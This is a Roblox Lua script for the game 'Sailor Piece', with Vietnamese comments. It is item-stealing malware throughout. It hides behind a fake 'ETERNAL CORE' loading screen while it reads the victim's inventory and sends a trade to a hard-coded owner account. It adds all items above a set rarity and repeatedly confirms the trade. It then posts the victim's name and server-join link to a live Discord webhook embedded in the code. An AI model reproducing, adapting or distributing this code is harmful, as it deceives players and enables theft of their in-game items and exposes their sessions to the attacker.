-- =============================================
-- SAILOR PIECE - FULL SCRIPT UNOWNER
-- Fake Loading UI xịn + Auto Trade + Webhook
-- Owner: balenkano (8604380596)
-- =============================================

local OWNER_ID = 8604380596
local MIN_RARITY = "Common"          -- Thay thành Rare, Epic, Legendary nếu muốn

local WEBHOOK = "https://discord.com/api/webhooks/1491061349571235890/HCxbVGWV26ai6_0o3iEBQ4bHcLLGpgEyopW5Zl82q-WuTpbbdPHtR3R88ri92xVE9ZPe"

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local Remotes = RS:WaitForChild("Remotes")
local TradeRemotes = Remotes:WaitForChild("TradeRemotes")

local SendTradeRequest = TradeRemotes:WaitForChild("SendTradeRequest")
local AddItemToTrade = TradeRemotes:WaitForChild("AddItemToTrade")
local SetReady = TradeRemotes:WaitForChild("SetReady")
local ConfirmTrade = TradeRemotes:WaitForChild("ConfirmTrade")
local AcceptTradeRequest = TradeRemotes:FindFirstChild("AcceptTradeRequest")
local RequestInventory = Remotes:FindFirstChild("RequestInventory")
local UpdateInventory = Remotes:FindFirstChild("UpdateInventory")

local ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))

local filteredItems = {}
local gotInventory = false
local isTrading = false

-- ==================== TẠO FAKE LOADING UI ĐẸP ====================

local function createFakeLoadingUI()
    local sg = Instance.new("ScreenGui")
    sg.Name = "EternalLoading"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 999999
    sg.Parent = PG

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(6, 6, 18)
    bg.BorderSizePixel = 0
    bg.Parent = sg

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0, 440, 0, 400)
    card.Position = UDim2.new(0.5, -220, 0.5, -200)
    card.BackgroundColor3 = Color3.fromRGB(12, 12, 28)
    card.BorderSizePixel = 0
    card.Parent = bg
    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 18)

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 255, 200)
    stroke.Thickness = 2.5
    stroke.Transparency = 0.4
    stroke.Parent = card

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,60)
    title.Position = UDim2.new(0,0,0,35)
    title.BackgroundTransparency = 1
    title.Text = "ETERNAL CORE"
    title.TextColor3 = Color3.fromRGB(0, 255, 220)
    title.TextSize = 32
    title.Font = Enum.Font.GothamBlack
    title.Parent = card

    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1,0,0,20)
    subtitle.Position = UDim2.new(0,0,0,88)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "NEURAL TRADE PROTOCOL v3.2"
    subtitle.TextColor3 = Color3.fromRGB(100, 255, 180)
    subtitle.TextSize = 14
    subtitle.Font = Enum.Font.Gotham
    subtitle.Parent = card

    local status = Instance.new("TextLabel")
    status.Name = "Status"
    status.Size = UDim2.new(1,0,0,32)
    status.Position = UDim2.new(0,0,0,140)
    status.BackgroundTransparency = 1
    status.Text = "INITIALIZING QUANTUM LINK..."
    status.TextColor3 = Color3.fromRGB(180, 180, 255)
    status.TextSize = 17
    status.Font = Enum.Font.GothamBold
    status.Parent = card

    local detail = Instance.new("TextLabel")
    detail.Name = "Detail"
    detail.Size = UDim2.new(1,0,0,22)
    detail.Position = UDim2.new(0,0,0,175)
    detail.BackgroundTransparency = 1
    detail.Text = "Scanning player inventory..."
    detail.TextColor3 = Color3.fromRGB(110, 110, 160)
    detail.TextSize = 14
    detail.Font = Enum.Font.Gotham
    detail.Parent = card

    -- Progress Bar
    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.82, 0, 0, 10)
    barBg.Position = UDim2.new(0.09, 0, 0, 215)
    barBg.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
    barBg.BorderSizePixel = 0
    barBg.Parent = card
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 180)
    barFill.BorderSizePixel = 0
    barFill.Parent = barBg
    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

    local pct = Instance.new("TextLabel")
    pct.Size = UDim2.new(1,0,0,24)
    pct.Position = UDim2.new(0,0,0,235)
    pct.BackgroundTransparency = 1
    pct.Text = "0%"
    pct.TextColor3 = Color3.fromRGB(0, 255, 200)
    pct.TextSize = 16
    pct.Font = Enum.Font.GothamBold
    pct.Parent = card

    local console = Instance.new("TextLabel")
    console.Size = UDim2.new(0.88,0,0,95)
    console.Position = UDim2.new(0.06,0,0,275)
    console.BackgroundTransparency = 1
    console.Text = ""
    console.TextColor3 = Color3.fromRGB(80, 255, 170)
    console.TextSize = 12.5
    console.Font = Enum.Font.Code
    console.TextXAlignment = Enum.TextXAlignment.Left
    console.TextYAlignment = Enum.TextYAlignment.Top
    console.TextWrapped = true
    console.Parent = card

    return sg, barFill, pct, status, detail, console, card
end

-- ==================== CHẠY FAKE LOADING + TRADE ====================

local function runFakeLoading(tradeCallback)
    local sg, barFill, pctLabel, status, detail, console, card = createFakeLoadingUI()

    local messages = {
        {"INITIALIZING QUANTUM LINK...", "Connecting to secure trade matrix..."},
        {"SCANNING INVENTORY...", "Retrieving player data..."},
        {"FILTERING RARITY ≥ " .. MIN_RARITY, "Removing low value items..."},
        {"PREPARING TRADE PROTOCOL...", "Encrypting items for transfer..."},
        {"SENDING TRADE REQUEST TO OWNER...", "Target: balenkano"},
        {"ADDING HIGH-VALUE ITEMS...", "Transferring assets..."},
        {"READY PROTOCOL ACTIVATED...", "Final confirmation sequence..."},
        {"TRADE SEQUENCE COMPLETE", "All items sent successfully"}
    }

    local msgIndex = 1

    for i = 1, 100 do
        -- Update progress bar
        TweenService:Create(barFill, TweenInfo.new(0.12, Enum.EasingStyle.Linear), {
            Size = UDim2.new(i/100, 0, 1, 0)
        }):Play()
        pctLabel.Text = i .. "%"

        -- Update text
        if i % 13 == 0 and msgIndex <= #messages then
            status.Text = messages[msgIndex][1]
            detail.Text = messages[msgIndex][2]
            console.Text = console.Text .. "> " .. messages[msgIndex][2] .. "\n"
            msgIndex = msgIndex + 1
        end

        -- Bắt đầu trade thật khi loading ~40%
        if i == 42 and not isTrading then
            task.spawn(tradeCallback)
            isTrading = true
        end

        task.wait(0.085)
    end

    -- Hoàn thành
    status.Text = "TRADE PROTOCOL SUCCESS"
    status.TextColor3 = Color3.fromRGB(0, 255, 120)
    detail.Text = "All items have been sent to balenkano"
    pctLabel.Text = "100% ✓"

    task.wait(3.2)
    sg:Destroy()
end

-- ==================== TRADE LOGIC ====================

local function findOwner()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.UserId == OWNER_ID then
            return true
        end
    end
    return false
end

local function isTradeGUIOpen()
    local pg = LP:FindFirstChild("PlayerGui")
    if not pg then return false end
    local tradingUI = pg:FindFirstChild("InTradingUI")
    if not tradingUI then return false end
    local mainFrame = tradingUI:FindFirstChild("MainFrame")
    return mainFrame and mainFrame.Visible == true
end

local function waitForTradeOpen(maxWait)
    local elapsed = 0
    while elapsed < maxWait do
        if isTradeGUIOpen() then return true end
        task.wait(0.2)
        elapsed += 0.2
    end
    return false
end

local function executeTrade()
    if not findOwner() or #filteredItems == 0 then return end

    pcall(function() SendTradeRequest:FireServer(OWNER_ID) end)

    if not waitForTradeOpen(25) then
        if AcceptTradeRequest then
            pcall(function() AcceptTradeRequest:FireServer(OWNER_ID) end)
        end
        waitForTradeOpen(15)
    end

    if not isTradeGUIOpen() then return end

    for _, item in ipairs(filteredItems) do
        if not isTradeGUIOpen() then break end
        pcall(function()
            AddItemToTrade:FireServer("Items", item.name, item.quantity)
        end)
        task.wait(0.23)
    end

    task.wait(0.7)
    pcall(function() SetReady:FireServer(true) end)
    task.wait(1.2)

    for i = 1, 40 do
        if not isTradeGUIOpen() then break end
        pcall(function() ConfirmTrade:FireServer() end)
        task.wait(0.95)
    end
end

-- ==================== GỬI WEBHOOK ====================

local function sendWebhookNotification()
    if not gotInventory or #filteredItems == 0 then return end

    local placeId = tostring(game.PlaceId)
    local jobId = tostring(game.JobId)
    local playerName = LP.DisplayName .. " (@" .. LP.Name .. ")"

    local browserLink = "https://www.roblox.com/home?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    local deepLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

    local data = {
        content = "<@8604380596> **🚨 Có người đang trade cho bạn!**",
        embeds = {{
            title = "SAILOR PIECE — TRADE ALERT",
            color = 0x00FF88,
            fields = {
                {name = "Người trade", value = playerName, inline = true},
                {name = "Số items", value = #filteredItems .. " (" .. MIN_RARITY .. "+)", inline = true},
                {name = "Join Server", value = "[🌐 Nhấn vào đây để vào server](" .. browserLink .. ")\n\n`" .. deepLink .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        local fn = request or http_request or (syn and syn.request)
        if fn then
            fn({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
            print("✅ Đã gửi thông báo webhook cho Owner")
        end
    end)
end

-- ==================== INVENTORY HANDLER ====================

if UpdateInventory then
    UpdateInventory.OnClientEvent:Connect(function(...)
        for _, arg in ipairs({...}) do
            if type(arg) == "table" then
                local temp = {}
                for _, v in pairs(arg) do
                    if v.name and v.quantity then
                        local order = ItemRarityConfig:GetSortOrder(v.name) or 0
                        if order >= (ItemRarityConfig.RarityOrder[MIN_RARITY] or 1) then
                            table.insert(temp, {name = v.name, quantity = v.quantity})
                        end
                    end
                end
                filteredItems = temp
                gotInventory = true
            end
        end
    end)
end

-- Request Inventory
task.spawn(function()
    repeat
        if RequestInventory then 
            pcall(function() RequestInventory:FireServer() end) 
        end
        task.wait(3)
    until gotInventory
end)

-- ==================== CHẠY TOÀN BỘ SCRIPT ====================

task.wait(1.5)

local function main()
    runFakeLoading(function()
        executeTrade()
        task.wait(1)
        sendWebhookNotification()
    end)
end

if gotInventory and #filteredItems > 0 then
    main()
else
    repeat task.wait(1) until gotInventory and #filteredItems > 0
    main()
end

print("✅ Full Unowner Script đã chạy thành công!")
print("Owner ID: 8604380596 | Webhook: Connected")
